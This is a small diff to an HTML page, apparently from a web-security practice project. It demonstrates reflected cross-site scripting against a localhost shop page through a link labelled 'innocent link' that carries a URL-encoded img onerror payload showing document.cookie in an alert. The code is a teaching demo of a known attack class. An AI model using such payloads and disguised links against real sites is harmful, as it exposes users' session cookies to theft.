@@ -6,10 +6,10 @@
 </head>
 <body>
 	<p>hello my friend, reflected xss</p>
+	<p>this attack doesn't work in chrome due to its XSS Auditor</p>
 
-	<!-- Doesn't work in chrome, so try firefox :>  -->
 	<a 
 		href="http://localhost/websec/shop.php?add=%3Cimg%20src%3D'%2F'%20onerror%3D'window.alert(document.cookie)'%3E"
-	>innocent link</a>
+	>click me / innocent link</a>
 </body>
 </html>
